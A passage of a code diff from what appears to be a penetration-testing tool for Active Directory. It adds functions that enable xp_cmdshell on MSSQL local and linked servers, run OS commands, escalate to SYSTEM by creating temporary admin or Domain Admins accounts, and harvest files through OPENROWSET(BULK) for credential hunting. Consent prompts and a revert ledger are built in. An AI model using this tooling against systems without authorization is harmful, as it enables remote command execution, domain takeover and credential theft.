+            f"xp_cmdshell enable failed on {marked_host}: "
+            f"{mark_sensitive(reason, 'detail')} — command execution via "
+            "xp_cmdshell is unavailable for this login."
+        )
+        print_info_debug(
+            "xp_cmdshell enable attempt failed on "
+            f"{marked_host}: {mark_sensitive(reason, 'detail')}."
+        )
+    else:
+        print_error(
+            f"xp_cmdshell enable failed on {marked_host} — insufficient SQL "
+            "privileges (ALTER SETTINGS / RECONFIGURE not held by this login)."
+        )
+        print_info_debug(
+            f"xp_cmdshell enable attempt was not confirmed on {marked_host}."
+        )
+    if ledger is not None and local_change_id:
+        try:
+            ledger.discard_change(local_change_id)
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+    return _LocalXpEnableOutcome(
+        xp_enabled=False,
+        enabled_by_us=False,
+        original_advanced_on=bool(original_advanced_on),
+        local_change_id=None,
+        declined=False,
+    )
+
+
+def _ensure_xp_cmdshell_enabled_linked(
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    *,
+    domain: str,
+    host: str,
+    linked_server: str,
+    username: str,
+    secret: str,
+) -> _LinkedXpEnableOutcome:
+    """Consent + ledger-register + enable ``xp_cmdshell`` on a LINKED server (SSOT).
+
+    Single source of truth for the linked-server enable shared by the ad-hoc
+    post-auth workflow's linked loop and the reusable primitive. The linked
+    server's pre-state cannot be read cheaply from here, so
+    ``original_xp_cmdshell`` is recorded as ``None`` (unknown) and the revert
+    disables unconditionally — the common case is a disabled link we are
+    unlocking for execution.
+
+    Returns:
+        A :class:`_LinkedXpEnableOutcome`; ``enabled=True`` only when our enable
+        was confirmed (the caller then tracks ``change_id`` for revert).
+    """
+    marked_link = mark_sensitive(linked_server, "hostname")
+    if not _consent_enable_xp_cmdshell(shell, marked_target=marked_link, is_linked=True):
+        print_info(
+            f"Operator declined enabling xp_cmdshell on linked server "
+            f"{marked_link}; leaving its configuration untouched."
+        )
+        return _LinkedXpEnableOutcome(enabled=False, change_id=None, declined=True)
+
+    print_info(f"Attempting linked-server xp_cmdshell enablement on {marked_link}.")
+    # Register BEFORE the enable (crash-safety).
+    linked_ledger = _get_env_change_ledger(shell)
+    linked_change_id: str | None = None
+    if linked_ledger is not None:
+        try:
+            linked_change_id = linked_ledger.register_change(
+                kind="mssql_xp_cmdshell_enabled",
+                domain=domain,
+                target=linked_server,
+                detail={
+                    "host": host,
+                    "linked_server": linked_server,
+                    "original_xp_cmdshell": None,
+                    "original_advanced_options": None,
+                    "enabled_via_linked_from": host,
+                },
+                method="sp_configure_at_link",
+                change_class=CHANGE_CLASS_AUTO_REVERT,
+            )
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+    link_enable = backend.enable_xp_cmdshell(
+        domain=domain,
+        username=username,
+        secret=secret,
+        linked_server=linked_server,
+        timeout=60,
+    )
+    if not link_enable.success:
+        print_warning(
+            "Linked-server xp_cmdshell enablement was not confirmed on "
+            f"{marked_link}."
+        )
+        # The enable did not take — the linked server's config is untouched, so
+        # DISCARD the write-ahead ledger record rather than reporting a change
+        # that never happened (which would inflate the client cleanup appendix).
+        if linked_ledger is not None and linked_change_id:
+            try:
+                linked_ledger.discard_change(linked_change_id)
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+        return _LinkedXpEnableOutcome(enabled=False, change_id=None, declined=False)
+
+    return _LinkedXpEnableOutcome(
+        enabled=True, change_id=linked_change_id, declined=False
+    )
+
+
+@dataclass
+class XpCmdshellExecResult:
+    """Outcome of running one ``xp_cmdshell`` command on a single MSSQL instance.
+
+    Returned by :func:`execute_xp_cmdshell_on_instance` — the reusable
+    per-instance primitive the attack-path ``XpCmdshell`` step drives. It maps
+    directly onto the attack-graph edge status: ``ok`` -> success, an
+    ``enable``/auth failure -> attempted, everything else -> failed with
+    ``reason``. ``enabled_by_us`` / ``already_enabled`` flow into the edge notes
+    so the report and web show whether WE modified the server.
+    """
+
+    ok: bool
+    enabled_by_us: bool
+    already_enabled: bool
+    output: str
+    reason: str
+    execution_identity: str
+    # Whether the xp_cmdshell WE enabled was disabled again before returning. When
+    # ``enabled_by_us`` is True but ``reverted`` is False, the caller DEFERRED the
+    # revert (e.g. to run a follow-up escalation that needs xp_cmdshell to stay
+    # on) and MUST revert it later via ``_revert_xp_cmdshell_enable`` using the
+    # ``change_id`` / ``original_advanced_on`` / ``linked_server`` below.
+    reverted: bool = False
+    change_id: str | None = None
+    original_advanced_on: bool = False
+    linked_server: str | None = None
+
+
+def _revert_xp_cmdshell_enable(
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    *,
+    domain: str,
+    username: str,
+    password: str,
+    host: str,
+    linked_server: str | None,
+    change_id: str | None,
+    original_advanced_on: bool,
+) -> bool:
+    """Disable the ``xp_cmdshell`` WE enabled and drive its ledger record to a
+    confirmed / manual-required terminal state. Returns True when confirmed.
+
+    Single per-change revert path shared by the ad-hoc post-auth workflow and the
+    reusable attack-step primitive, so an ``xp_cmdshell`` we turned on is always
+    turned back off — local: restore the pre-enable advanced-options state and
+    re-read to verify; linked: ``disable_xp_cmdshell_on_link`` over the link. A
+    failed / unconfirmed revert routes to ``manual_required`` so the client always
+    gets a cleanup checklist instead of a silently-modified server.
+    """
+    marked = mark_sensitive(linked_server or host, "hostname")
+    ledger = _get_env_change_ledger(shell)
+    if ledger is not None and change_id:
+        try:
+            ledger.mark_revert_in_progress(change_id)
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+
+    reverted = False
+    verified = False
+    verification = "xp_cmdshell_disable"
+    try:
+        if linked_server:
+            revert_result = backend.execute_query(
+                domain=domain,
+                username=username,
+                secret=password,
+                query=mssql_queries.disable_xp_cmdshell_on_link(linked_server),
+                timeout=60,
+            )
+            reverted = bool(getattr(revert_result, "success", False))
+            # A remote state re-read over the link is not cheap; a confirmed
+            # disable statement is the verification for the linked path.
+            verified = reverted
+            verification = "xp_cmdshell_disable_on_link"
+        else:
+            revert_result = backend.disable_xp_cmdshell(
+                domain=domain,
+                username=username,
+                secret=password,
+                restore_advanced_options=original_advanced_on,
+                timeout=60,
+            )
+            reverted = bool(getattr(revert_result, "success", False))
+            verification = "xp_cmdshell_state_reread"
+            if reverted:
+                try:
+                    post_state, _ = backend._read_xp_cmdshell_state(
+                        domain=domain, username=username, secret=password, timeout=30
+                    )
+                    verified = post_state != XpCmdshellStatus.ENABLED
+                except Exception as exc:  # noqa: BLE001 - verify re-read is best-effort
+                    telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
+                    verified = False
+    except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        print_warning(f"xp_cmdshell revert raised on {marked}: {exc}.")
+        reverted = False
+
+    if reverted and verified:
+        print_info_debug(f"xp_cmdshell reverted to disabled on {marked}.")
+        if ledger is not None and change_id:
+            try:
+                ledger.mark_reverted_confirmed(
+                    change_id,
+                    verification_method=verification,
+                    min_credential_principal=username,
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+        return True
+
+    print_warning(
+        f"xp_cmdshell revert was NOT confirmed on {marked} — verify the SQL "
+        "Server configuration manually."
+    )
+    _route_xp_cmdshell_revert_failure(
+        ledger,
+        change_id or "",
+        host=host,
+        linked_server=linked_server,
+        error="xp_cmdshell disable/verify not confirmed",
+    )
+    return False
+
+
+def _finalize_xp_cmdshell_result(
+    result: XpCmdshellExecResult,
+    *,
+    shell: MssqlShell,
+    backend: ImpacketMSSQLBackend,
+    domain: str,
+    username: str,
+    password: str,
+    host: str,
+    linked_server: str | None,
+    change_id: str | None,
+    original_advanced_on: bool,
+    revert: bool,
+) -> XpCmdshellExecResult:
+    """Revert the xp_cmdshell WE enabled (unless deferred) + stamp the tracking
+    fields on the result.
+
+    Reverting REGARDLESS of the command outcome is the invariant that stops a
+    best-effort execution from leaving the client's SQL Server configuration
+    modified. When ``revert=False`` the caller keeps xp_cmdshell on for a
+    follow-up (e.g. a SYSTEM escalation) and MUST revert it later via the returned
+    ``change_id`` / ``linked_server`` / ``original_advanced_on``.
+    """
+    reverted = False
+    if result.enabled_by_us and change_id and revert:
+        reverted = _revert_xp_cmdshell_enable(
+            shell,
+            backend,
+            domain=domain,
+            username=username,
+            password=password,
+            host=host,
+            linked_server=linked_server,
+            change_id=change_id,
+            original_advanced_on=original_advanced_on,
+        )
+    return replace(
+        result,
+        reverted=reverted,
+        change_id=change_id,
+        original_advanced_on=original_advanced_on,
+        linked_server=linked_server,
+    )
+
+
+def execute_xp_cmdshell_on_instance(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    linked_server: str | None = None,
+    command: str = "whoami",
+    already_enabled_hint: bool | None = None,
+    revert: bool = True,
+) -> XpCmdshellExecResult:
+    """Enable-if-needed + run ONE ``xp_cmdshell`` command on an instance (SSOT).
+
+    The single reusable primitive for the ``XpCmdshell`` attack-step: it does the
+    smallest cohesive unit both callers share — build the backend exactly like
+    :func:`run_mssql_postauth_workflow` (posture-aware NTLM sticky fallback +
+    DC/KDC resolution), check the current ``xp_cmdshell`` state, consent + enable
+    + ledger-register when disabled (via the shared
+    :func:`_ensure_xp_cmdshell_enabled_local` /
+    :func:`_ensure_xp_cmdshell_enabled_linked` helpers, so the scan-end ledger
+    path reverts what WE enabled), verify usability for the local path, run the
+    command, and return an :class:`XpCmdshellExecResult`. It does NOT re-verify
+    the SQL access already proven by the earlier ``SQLAccess`` / ``SQLAdmin``
+    step, and does NOT revert (the ledger record tracks that).
+
+    Args:
+        shell: The MSSQL shell (threaded for consent / non-interactive default
+            and to resolve the ledger + posture).
+        domain: Authentication domain for the credential.
+        host: The SOURCE MSSQL instance host to connect to.
+        username: Login / sAMAccountName for the connection.
+        password: Password, NT hash, or ``.ccache`` path.
+        linked_server: When set, execute ``AT [linked_server]`` (the command runs
+            on the linked instance reached via ``host``); ``None`` runs locally.
+        command: The OS command to run (default a benign ``whoami`` identity probe).
+        already_enabled_hint: Pre-observed ``xp_cmdshell`` state from an earlier
+            step (skips the state re-read when provided).
+
+    Returns:
+        An :class:`XpCmdshellExecResult` mapping onto the attack-graph edge status.
+    """
+    from adscan_internal.models.domain import resolve_dc_ip
+    from adscan_internal.services.mssql_auth import (
+        resolve_mssql_ntlm_fallback_secret,
+    )
+
+    marked_host = mark_sensitive(host, "hostname")
+    marked_user = mark_sensitive(username, "user")
+    is_linked = bool(linked_server)
+
+    # Build the backend the SAME way the monolith does (SSOT): Kerberos-first with
+    # a posture-aware sticky NTLM fallback and an explicit DC/KDC IP.
+    kdc_host = resolve_dc_ip(
+        (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+    )
+    ntlm_fallback_secret = resolve_mssql_ntlm_fallback_secret(
+        shell,
+        domain=domain,
+        username=username,
+        wire_secret=password,
+        password=password,
+    )
+    backend = ImpacketMSSQLBackend(
+        host=host,
+        domain=domain,
+        kdc_host=kdc_host,
+        ntlm_fallback_secret=ntlm_fallback_secret,
+    )
+
+    # Observe the current xp_cmdshell state before touching anything.
+    if is_linked:
+        # A linked server's remote state cannot be read cheaply from here; treat
+        # the hint (if any) as the observation and otherwise attempt the enable.
+        already_enabled = bool(already_enabled_hint) if already_enabled_hint is not None else False
+    elif already_enabled_hint is not None:
+        already_enabled = bool(already_enabled_hint)
+    else:
+        try:
+            _state, _ = backend._read_xp_cmdshell_state(
+                domain=domain,
+                username=username,
+                secret=password,
+                timeout=30,
+            )
+            already_enabled = _state == XpCmdshellStatus.ENABLED
+        except Exception as exc:  # noqa: BLE001 - state read is best-effort
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+            already_enabled = False
+
+    enabled_by_us = False
+    change_id: str | None = None
+    original_advanced_on = False
+    if is_linked:
+        linked_outcome = _ensure_xp_cmdshell_enabled_linked(
+            shell,
+            backend,
+            domain=domain,
+            host=host,
+            linked_server=linked_server,  # type: ignore[arg-type]
+            username=username,
+            secret=password,
+        )
+        if linked_outcome.declined:
+            return XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=False,
+                already_enabled=already_enabled,
+                output="",
+                reason="operator_declined_enable",
+                execution_identity="",
+            )
+        if not linked_outcome.enabled:
+            return XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=False,
+                already_enabled=already_enabled,
+                output="",
+                reason="xp_cmdshell_enable_failed",
+                execution_identity="",
+            )
+        enabled_by_us = True
+        change_id = linked_outcome.change_id
+    else:
+        local_outcome = _ensure_xp_cmdshell_enabled_local(
+            shell,
+            backend,
+            domain=domain,
+            host=host,
+            username=username,
+            secret=password,
+            marked_host=marked_host,
+            marked_user=marked_user,
+            currently_enabled=already_enabled,
+        )
+        if local_outcome.declined:
+            return XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=False,
+                already_enabled=already_enabled,
+                output="",
+                reason="operator_declined_enable",
+                execution_identity="",
+            )
+        if not local_outcome.xp_enabled:
+            return XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=False,
+                already_enabled=already_enabled,
+                output="",
+                reason="xp_cmdshell_not_enabled",
+                execution_identity="",
+            )
+        enabled_by_us = local_outcome.enabled_by_us
+        change_id = local_outcome.local_change_id
+        original_advanced_on = local_outcome.original_advanced_on
+        # Enabled != usable: a non-sysadmin login can still be denied EXECUTE or
+        # miss a proxy account. Confirm with the existing benign probe (SSOT).
+        if not _verify_xp_cmdshell_executable(
+            backend,
+            domain=domain,
+            username=username,
+            secret=password,
+        ):
+            # We enabled it but it is not usable — still route through finalize so
+            # the enable WE made is reverted, never left on the client's server.
+            return _finalize_xp_cmdshell_result(
+                XpCmdshellExecResult(
+                    ok=False,
+                    enabled_by_us=enabled_by_us,
+                    already_enabled=already_enabled,
+                    output="",
+                    reason="xp_cmdshell_not_usable",
+                    execution_identity="",
+                ),
+                shell=shell,
+                backend=backend,
+                domain=domain,
+                username=username,
+                password=password,
+                host=host,
+                linked_server=linked_server,
+                change_id=change_id,
+                original_advanced_on=original_advanced_on,
+                revert=revert,
+            )
+
+    # Run the requested command (local, or AT [linked_server]).
+    try:
+        exec_result = backend.execute_command(
+            domain=domain,
+            username=username,
+            secret=password,
+            command=command,
+            host=host,
+            linked_server=linked_server,
+            timeout=120,
+        )
+    except Exception as exc:  # noqa: BLE001 - surface as a failed step, not a crash
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        result = XpCmdshellExecResult(
+            ok=False,
+            enabled_by_us=enabled_by_us,
+            already_enabled=already_enabled,
+            output="",
+            reason=f"execution_error: {exc}",
+            execution_identity="",
+        )
+    else:
+        output = exec_result.stdout or ""
+        lines = exec_result.stdout_lines
+        identity = lines[0].strip() if lines else ""
+        if not exec_result.success:
+            result = XpCmdshellExecResult(
+                ok=False,
+                enabled_by_us=enabled_by_us,
+                already_enabled=already_enabled,
+                output=output,
+                reason=str(exec_result.error_message or "command_execution_failed"),
+                execution_identity=identity,
+            )
+        else:
+            result = XpCmdshellExecResult(
+                ok=True,
+                enabled_by_us=enabled_by_us,
+                already_enabled=already_enabled,
+                output=output,
+                reason="",
+                execution_identity=identity,
+            )
+
+    # Revert what WE enabled (unless deferred) regardless of command outcome.
+    return _finalize_xp_cmdshell_result(
+        result,
+        shell=shell,
+        backend=backend,
+        domain=domain,
+        username=username,
+        password=password,
+        host=host,
+        linked_server=linked_server,
+        change_id=change_id,
+        original_advanced_on=original_advanced_on,
+        revert=revert,
+    )
+
+
+def _consent_mssql_system_escalation(shell: MssqlShell, *, target: str) -> bool:
+    """Consent gate for the post-XpCmdshell SYSTEM-escalation follow-up.
+
+    Escalating the confirmed ``xp_cmdshell`` RCE to ``NT AUTHORITY\\SYSTEM`` mints
+    a temporary local/domain admin account on the client's host (auto-removed
+    afterward). ``ADSCAN_NO_MSSQL_ESCALATION=1`` opts out entirely (returns
+    ``False``). Non-interactive engagements proceed by default — the money-path
+    convention for post-exploitation: the attack path was already selected.
+    Interactive runs must confirm explicitly (default ``No`` — this is destructive).
+
+    Args:
+        shell: The MSSQL shell (threaded so the non-interactive predicate can see
+            ``shell.auto`` / the session command type).
+        target: Human-readable escalation target label (the ``to_label`` or host).
+
+    Returns:
+        True to proceed with the escalation, False to skip it.
+    """
+    if os.environ.get("ADSCAN_NO_MSSQL_ESCALATION") == "1":
+        print_info_debug(
+            "ADSCAN_NO_MSSQL_ESCALATION=1 — skipping the MSSQL SYSTEM escalation "
+            "follow-up."
+        )
+        return False
+    if is_non_interactive(shell):
+        print_info_debug(
+            "Non-interactive engagement — proceeding with the MSSQL SYSTEM "
+            f"escalation follow-up against {mark_sensitive(target, 'hostname')}."
+        )
+        return True
+
+    from adscan_core.output import confirm_operation  # noqa: PLC0415
+
+    return confirm_operation(
+        "MSSQL SYSTEM Escalation",
+        "Escalate the confirmed xp_cmdshell RCE to NT AUTHORITY\\SYSTEM and mint a "
+        "temporary admin account (auto-removed afterward) to prove domain impact.",
+        context={"Target": target},
+        default=False,
+        icon="⚡",
+    )
+
+
+def _resolve_cross_domain_target_domain(
+    shell: MssqlShell, *, auth_domain: str, target_host: str
+) -> str:
+    """Return the AD domain that actually owns ``target_host`` for credential handoff.
+
+    A linked-server escalation target is usually inside the same domain as the
+    source MSSQL instance (``auth_domain``). It is NOT always — the classic
+    cross-forest chain is an untrusted-but-linked SQL Server pointing at a DC in
+    a completely different realm (e.g. ``darkzero.htb`` DC01 -> ``darkzero.ext``
+    DC02). A credential minted on that host belongs to the FOREIGN domain, never
+    ``auth_domain``; feeding ``auth_domain`` into ``add_credential`` sends the
+    verification AS-REQ to the wrong KDC and the credential can never resolve.
+
+    Resolution: derive the candidate domain from ``target_host``'s FQDN suffix
+    and only trust it when ``domains_data`` already has a REAL entry for that
+    domain — populated by trust enumeration's cross-domain connectivity precheck
+    (``domains.py`` / ``domain_connectivity_service.py``), never invented here.
+    When no such entry exists (the common same-domain case, or an FQDN-less
+    short host label), this returns ``auth_domain`` unchanged so every existing
+    same-domain caller is byte-for-byte unaffected.
+    """
+    host = str(target_host or "").strip().rstrip(".").lower()
+    auth_domain_clean = str(auth_domain or "").strip().rstrip(".").lower()
+    if "." not in host:
+        return auth_domain
+    suffix = host.split(".", 1)[1].strip(".")
+    if not suffix or suffix == auth_domain_clean:
+        return auth_domain
+    domains_data = getattr(shell, "domains_data", None) or {}
+    for candidate_domain in domains_data:
+        if str(candidate_domain or "").strip().rstrip(".").lower() == suffix:
+            return str(candidate_domain)
+    return auth_domain
+
+
+def _resolve_linked_escalation_target(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    to_label: str,
+    linked_server: str | None,
+) -> tuple[str, str, str, bool, str]:
+    """Resolve the SYSTEM-escalation target (host, IP, FQDN, is_dc, target_domain).
+
+    The ``XpCmdshell`` edge terminates at ``to_label`` — the linked-server remote
+    instance (e.g. ``DC02`` in a ``DC01 -> DC02`` chain) or the local instance
+    itself. This resolves that graph-node label into a connectable host string and
+    reuses the Domain-Controller detection from :func:`run_mssql_takeover`: when
+    the escalation target IS a DC, the minted account is a DOMAIN account added to
+    "Domain Admins" (``is_dc=True``), otherwise a local Administrator.
+
+    ``is_dc`` deliberately stays scoped to ``domain`` (the auth domain) even in
+    the cross-domain case: :class:`MssqlSeImpersonateService`'s DC-branch
+    verification (native LDAP RID-512 check) is hardcoded to query ``domain``,
+    so flipping ``is_dc`` for a foreign DC would break that verification, not
+    fix it. ``target_domain`` is a SEPARATE, additive resolution — see
+    :func:`_resolve_cross_domain_target_domain` — used only for the downstream
+    credential handoff (which domain a minted credential must be verified
+    against), never for the exploitation service's own group/verification choice.
+
+    Args:
+        shell: The MSSQL shell (used to load the attack graph + domains data).
+        domain: The (authentication) domain whose graph/DC data to consult.
+        to_label: The XpCmdshell edge's target node label.
+        linked_server: The linked-server name when the RCE ran ``AT [link]``.
+
+    Returns:
+        ``(target_host, target_ip, target_fqdn, is_dc, target_domain)``.
+        ``target_ip`` is always non-empty (falls back to the resolved host
+        string) so the derived edge can be recorded.
+    """
+    from adscan_internal.models.domain import (  # noqa: PLC0415
+        resolve_dc_fqdn,
+        resolve_dc_ip,
+    )
+    from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
+        resolve_netexec_target_for_node_label,
+    )
+
+    label = str(to_label or linked_server or "").strip()
+    domain_record = (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+    dc_fqdn = str(resolve_dc_fqdn(domain_record, target_domain=domain) or "").lower()
+    kdc_host = resolve_dc_ip(domain_record)
+
+    resolved_host: str | None = None
+    try:
+        resolved_host = resolve_netexec_target_for_node_label(
+            shell, domain, node_label=label
+        )
+    except Exception as exc:  # noqa: BLE001 - resolution is best-effort
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+    target_host = str(resolved_host or label or "").strip()
+
+    host_l = target_host.lower()
+    is_dc = bool(host_l) and (
+        host_l == dc_fqdn
+        or (bool(kdc_host) and host_l == str(kdc_host).lower())
+        or (bool(dc_fqdn) and host_l.split(".", 1)[0] == dc_fqdn.split(".", 1)[0])
+    )
+
+    if is_dc:
+        target_fqdn = dc_fqdn or target_host
+        target_ip = str(kdc_host or target_host)
+    else:
+        target_fqdn = target_host if "." in target_host else ""
+        target_ip = target_host
+
+    target_domain = _resolve_cross_domain_target_domain(
+        shell, auth_domain=domain, target_host=target_host
+    )
+    return target_host, target_ip, target_fqdn, is_dc, target_domain
+
+
+def revert_deferred_xp_cmdshell(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    xp_result: XpCmdshellExecResult,
+) -> None:
+    """Disable a DEFERRED ``xp_cmdshell`` enable exactly once (best-effort).
+
+    :func:`execute_xp_cmdshell_on_instance` called with ``revert=False`` keeps
+    ``xp_cmdshell`` on so a follow-up escalation can use it, returning the
+    ``change_id`` / ``original_advanced_on`` / ``linked_server`` needed to revert
+    later. This is the single deferred-revert entry point: it no-ops when WE did
+    not enable it, when there is no tracked change, or when it was already
+    reverted, then rebuilds the backend and delegates to the shared
+    :func:`_revert_xp_cmdshell_enable` so an ``xp_cmdshell`` we turned on is always
+    turned back off — never leaving the client's SQL Server modified.
+
+    Idempotent: it stamps ``xp_result.reverted`` so a second call (e.g. the
+    handler's defensive fallback) is a no-op.
+    """
+    try:
+        if (
+            not (xp_result.enabled_by_us and xp_result.change_id)
+            or xp_result.reverted
+        ):
+            return
+        # Mark reverted up front so any re-entrant / fallback call no-ops.
+        xp_result.reverted = True
+
+        from adscan_internal.models.domain import resolve_dc_ip  # noqa: PLC0415
+
+        kdc_host = resolve_dc_ip(
+            (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+        )
+        backend = ImpacketMSSQLBackend(host=host, domain=domain, kdc_host=kdc_host)
+        _revert_xp_cmdshell_enable(
+            shell,
+            backend,
+            domain=domain,
+            username=username,
+            password=password,
+            host=host,
+            linked_server=xp_result.linked_server,
+            change_id=xp_result.change_id,
+            original_advanced_on=xp_result.original_advanced_on,
+        )
+    except Exception as exc:  # noqa: BLE001 - deferred revert is best-effort hygiene
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        print_warning(f"Deferred xp_cmdshell revert raised: {exc}.")
+
+
+@dataclass(frozen=True, slots=True)
+class OpenRowsetBulkReadResult:
+    """Outcome of one ``OPENROWSET(BULK ...)`` content-read attack-step execution."""
+
+    ok: bool
+    reason: str = ""
+    entry_count: int = 0
+    output_path: str | None = None
+    phases_run: tuple[dict[str, object], ...] = ()
+
+
+def run_openrowset_bulk_read_on_instance(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+    linked_server: str | None = None,
+) -> OpenRowsetBulkReadResult:
+    """Confirm ADMINISTER BULK OPERATIONS live, discover files via ``xp_dirtree``,
+    read their content via ``OPENROWSET(BULK ..., SINGLE_BLOB)``, and feed the
+    bytes into the EXISTING credential-hygiene analysis pipeline — the
+    executable form of the ``MssqlOpenRowsetBulkRead`` attack step (chained off
+    SQLAccess / SQLAdmin / MssqlLinkedServerLateral, mirroring
+    :func:`execute_xp_cmdshell_on_instance`).
+
+    Unlike ``xp_cmdshell`` this needs no enable/revert dance — the capability
+    either exists (sysadmin, ``bulkadmin`` role membership, or an explicit
+    ``ADMINISTER BULK OPERATIONS`` grant) or it does not; there is no
+    configuration state to flip.
+
+    Reuses the SAME discovery + manifest shape as the low-privilege
+    ``xp_dirtree`` review (``mssql_xp_dirtree_review_service``) and the SAME
+    sensitive-phase execution pipeline (``WindowsSensitivePhaseExecutionService``
+    / ``WindowsArtifactAcquisitionService``) so credsweeper / loot-credential
+    analysis is unchanged regardless of which transport discovered the files.
+    """
+    from adscan_internal.models.domain import resolve_dc_ip
+    from adscan_internal.services.mssql_auth import (
+        resolve_mssql_ntlm_fallback_secret,
+    )
+    from adscan_internal.services.mssql_xp_dirtree_review_service import (
+        DEFAULT_XP_DIRTREE_REVIEW_ROOTS,
+        DEFAULT_XP_DIRTREE_WALK_DEPTH,
+        build_manifest_from_xp_dirtree_walk,
+    )
+
+    marked_host = mark_sensitive(host, "hostname")
+    _link_label = f" AT [{mark_sensitive(linked_server, 'hostname')}]" if linked_server else ""
+
+    kdc_host = resolve_dc_ip(
+        (getattr(shell, "domains_data", None) or {}).get(domain) or {}
+    )
+    ntlm_fallback_secret = resolve_mssql_ntlm_fallback_secret(
+        shell,
+        domain=domain,
+        username=username,
+        wire_secret=password,
+        password=password,
+    )
+    backend = ImpacketMSSQLBackend(
+        host=host,
+        domain=domain,
+        kdc_host=kdc_host,
+        ntlm_fallback_secret=ntlm_fallback_secret,
+    )
+
+    # Live-confirm the capability — the graph fact may be stale, and a
+    # below-sysadmin SQLAccess login's ADMINISTER BULK OPERATIONS grant can be
+    # revoked between collection and execution.
+    capability_result = backend.execute_query(
+        domain=domain,
+        username=username,
+        secret=password,
+        query=mssql_queries.BULK_OPERATIONS_CAPABILITY_PROBE,
+        linked_server=linked_server,
+        timeout=30,
+    )
+    if not capability_result.success:
+        return OpenRowsetBulkReadResult(ok=False, reason="capability_probe_failed")
+    bulk_capable = False
+    for row in capability_result.rows or []:
+        value = row.get("bulk_admin")
+        if value is None:
+            continue
+        bulk_capable = bool(value) if isinstance(value, bool) else bool(int(value))
+        break
+    if not bulk_capable:
+        print_info(
+            f"OPENROWSET(BULK ...) is not reachable on {marked_host}{_link_label}: "
+            "the connecting login does not hold ADMINISTER BULK OPERATIONS."
+        )
+        return OpenRowsetBulkReadResult(ok=False, reason="not_bulk_capable")
+
+    # Discovery — SAME default review roots + manifest shape the low-privilege
+    # xp_dirtree review builds (queried directly via execute_query so the
+    # linked-server case is supported; the review service's own wrapper method
+    # has no linked_server parameter).
+    rows_by_root: dict[str, list[dict]] = {}
+    for root in DEFAULT_XP_DIRTREE_REVIEW_ROOTS:
+        discovery_result = backend.execute_query(
+            domain=domain,
+            username=username,
+            secret=password,
+            query=mssql_queries.xp_dirtree_local(
+                root, depth=DEFAULT_XP_DIRTREE_WALK_DEPTH, include_files=1
+            ),
+            linked_server=linked_server,
+            timeout=30,
+        )
+        if discovery_result.success:
+            rows_by_root[root] = list(discovery_result.rows or [])
+    manifest = build_manifest_from_xp_dirtree_walk(
+        roots=DEFAULT_XP_DIRTREE_REVIEW_ROOTS,
+        rows_by_root=rows_by_root,
+        metadata={"transport": "mssql_openrowset_bulk"},
+    )
+    entries: list[WindowsFileMapEntry] = list(manifest.get("entries") or [])
+    if not entries:
+        print_info(
+            f"No files discovered for OPENROWSET(BULK ...) content read on {marked_host}{_link_label}."
+        )
+        return OpenRowsetBulkReadResult(ok=True, reason="no_entries", entry_count=0)
+
+    workspace_dir = _get_workspace_dir(shell)
+    cache_key = WindowsFileMappingService.build_cache_key(
+        host=host,
+        username=username,
+        root_strategy="openrowset_bulk",
+    )
+    output_path = os.path.join(
+        workspace_dir,
+        shell.domains_dir,
+        domain,
+        "mssql",
+        "sensitive",
+        cache_key,
+        "file_tree_map.json",
+    )
+    os.makedirs(os.path.dirname(output_path), exist_ok=True)
+    with open(output_path, "w", encoding="utf-8") as handle:
+        json.dump(
+            {**manifest, "entries": [asdict(entry) for entry in entries]},
+            handle,
+            indent=2,
+        )
+    print_warning(
+        f"OPENROWSET(BULK ...) content-read exposure on {marked_host}{_link_label}: "
+        f"{len(entries)} file(s) reachable without command execution. Recommend "
+        "revoking ADMINISTER BULK OPERATIONS from logins that do not need it."
+    )
+
+    run_root_abs = os.path.join(os.path.dirname(output_path), "phases")
+    os.makedirs(run_root_abs, exist_ok=True)
+
+    def _bulk_read_fetcher(remote_path: str, save_path: str) -> str:
+        result = backend.download_file(
+            domain=domain,
+            username=username,
+            secret=password,
+            remote_path=remote_path,
+            local_path=save_path,
+            linked_server=linked_server,
+            timeout=300,
+        )
+        if not result.success:
+            raise RuntimeError(
+                result.error_message or "OPENROWSET(BULK ...) content read failed."
+            )
+        return save_path
+
+    from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
+        select_sensitive_scan_phases,
+    )
+
+    selected_phases = select_sensitive_scan_phases(
+        shell, domain=domain, transport_label="MSSQL (OPENROWSET BULK)"
+    )
+    if not selected_phases:
+        print_info(
+            "No MSSQL OPENROWSET(BULK) credential-hunt phases selected — skipping analysis."
+        )
+        return OpenRowsetBulkReadResult(
+            ok=True,
+            reason="no_phases_selected",
+            entry_count=len(entries),
+            output_path=output_path,
+        )
+
+    phase_sequence = get_production_sensitive_scan_phase_sequence()
+    results: list[dict[str, object]] = []
+
+    def _run_phase(phase: str) -> dict[str, object]:
+        phase_definition = get_sensitive_phase_definition(phase)
